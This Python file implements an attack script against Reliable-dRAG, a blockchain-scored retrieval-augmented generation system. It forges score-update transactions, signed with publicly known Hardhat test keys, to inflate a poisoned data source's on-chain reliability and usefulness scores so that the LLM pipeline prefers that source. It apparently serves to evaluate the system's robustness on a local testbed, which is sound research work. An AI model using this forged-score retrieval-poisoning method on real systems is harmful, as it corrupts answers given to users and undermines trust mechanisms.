"""
SSM-Score Manipulation Attack against Reliable-dRAG.
Attack Principle
----------------
The Reliable-dRAG system uses on-chain reliability (R_i) and usefulness (U_i)
scores to decide WHICH data source to query and how to WEIGHT its documents.
Because all private keys are publicly known Hardhat test keys, an attacker
who controls a data source can submit forged score-update transactions that
artificially inflate their source's R_i / U_i values.
Result: the system preferentially selects the high-scoring but fully-poisoned
sources_100 source, degrading answer accuracy without injecting any new documents.
"""
import json
import os
import sys
import time
from typing import Dict, List, Optional
PRIVATE_KEYS = {
    "sources_0":   "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
    "sources_20":  "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d",
    "sources_100": "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a",
    "llm_service": "0x701b615bbdfb9de65240bc28bd21bbc0d996645a3dd57e7b12bc2bdf6f192c82",
}
DEFAULT_DATA_SOURCES = {
    "sources_0":   "http://localhost:8001",
    "sources_20":  "http://localhost:8002",
    "sources_100": "http://localhost:8003",
}
LLM_SERVICE_URL = "http://localhost:9000"
BLOCKCHAIN_URL  = "http://localhost:8545"
class SSMScoreAttack:
    def __init__(
        self,
        target_source: str = "sources_100",
        blockchain_url: str = BLOCKCHAIN_URL,
        project_root: Optional[str] = None,
        amplify: int = 999_999,
        rounds: int = 5,
        llm_service_url: str = LLM_SERVICE_URL,
    ):
        self.target_source   = target_source
        self.blockchain_url  = blockchain_url
        self.amplify         = amplify
        self.rounds          = rounds
        self.llm_service_url = llm_service_url
        self.project_root    = project_root or os.path.abspath(
            os.path.join(os.path.dirname(__file__), '..', '..')
        )
        self._client = None
    def _get_client(self):
        if self._client is not None:
            return self._client
        sys.path.insert(0, os.path.join(self.project_root, 'drag_python_client'))
        from drag_python_client import DragScoresClient
        self._client = DragScoresClient(
            project_root=self.project_root,
            provider_url=self.blockchain_url,
        )
        return self._client
    def get_current_scores(self) -> Dict[str, Dict[str, int]]:
        client = self._get_client()
        source_ids = list(DEFAULT_DATA_SOURCES.keys())
        ids, rel_scores, use_scores = client.get_scores_batch(source_ids)
        result = {}
        for i, sid in enumerate(ids):
            result[sid] = {
                "reliability": rel_scores[i] if i < len(rel_scores) else 0,
                "usefulness":  use_scores[i]  if i < len(use_scores)  else 0,
            }
        return result
    def _sign_fake_message(self, source_id: str) -> bytes:
        sys.path.insert(0, os.path.join(self.project_root, 'drag_python_client'))
        from drag_python_client import sign_message_personal
        fake_message = json.dumps({
            "query": "attack_probe",
            "selected_sources": {sid: [0, 0] for sid in DEFAULT_DATA_SOURCES}
        }, sort_keys=True)
        return sign_message_personal(fake_message, PRIVATE_KEYS[source_id])
    def inflate_scores(self, target_source: Optional[str] = None) -> Dict:
        target = target_source or self.target_source
        client = self._get_client()
        before = self.get_current_scores()
        print(f"\n  Scores BEFORE attack:")
        for sid, s in before.items():
            marker = " <- TARGET" if sid == target else ""
            print(f"    {sid:15s}  R={s['reliability']:>10,}  U={s['usefulness']:>10,}{marker}")
        tx_hashes = []
        for rnd in range(1, self.rounds + 1):
            print(f"\n  Round {rnd}/{self.rounds} -- inflating {target}...")
            try:
                current = self.get_current_scores()
                cur_rel = current.get(target, {}).get("reliability", 0)
                cur_use = current.get(target, {}).get("usefulness",  0)
                new_rel = cur_rel + self.amplify
                new_use = cur_use + self.amplify
                sig_bytes = self._sign_fake_message(target)
                fake_message = json.dumps({
                    "query": "attack_probe",
                    "selected_sources": {sid: [0, 0] for sid in DEFAULT_DATA_SOURCES}
                }, sort_keys=True)
                tx = client.feedback_and_update_score_records(
                    caller_private_key=PRIVATE_KEYS["llm_service"],
                    message=fake_message,
                    signatures=[sig_bytes],
                    update_source_ids=[target],
                    update_reliability_scores=[new_rel],
                    update_usefulness_scores=[new_use],
                    info=f"SSM_ATTACK_round_{rnd}",
                )
                tx_hashes.append(tx)
                print(f"    TX: {tx}  ->  R={new_rel:,}  U={new_use:,}")
                time.sleep(0.5)
            except Exception as e:
                print(f"    ERROR in round {rnd}: {e}")
        after = self.get_current_scores()
        print(f"\n  Scores AFTER attack:")
        for sid, s in after.items():
            marker = " <- TARGET" if sid == target else ""
            print(f"    {sid:15s}  R={s['reliability']:>10,}  U={s['usefulness']:>10,}{marker}")
        return {
            "target_source": target,
            "rounds": self.rounds,
            "amplify_per_round": self.amplify,
            "tx_hashes": tx_hashes,
            "scores_before": before,
            "scores_after":  after,
        }
    def reset_scores(self) -> Dict:
        client = self._get_client()
        results = {}
        for source_id in DEFAULT_DATA_SOURCES:
            try:
                sig_bytes = self._sign_fake_message(source_id)
                fake_message = json.dumps({
                    "query": "reset",
                    "selected_sources": {sid: [0, 0] for sid in DEFAULT_DATA_SOURCES}
                }, sort_keys=True)
                tx = client.feedback_and_update_score_records(
                    caller_private_key=PRIVATE_KEYS["llm_service"],
                    message=fake_message,
                    signatures=[sig_bytes],
                    update_source_ids=[source_id],
                    update_reliability_scores=[10000],
                    update_usefulness_scores=[10000],
                    info="SSM_ATTACK_reset",
                )
                results[source_id] = f"reset OK (tx={tx})"
                time.sleep(0.3)
            except Exception as e:
                results[source_id] = f"ERROR: {e}"
        return results
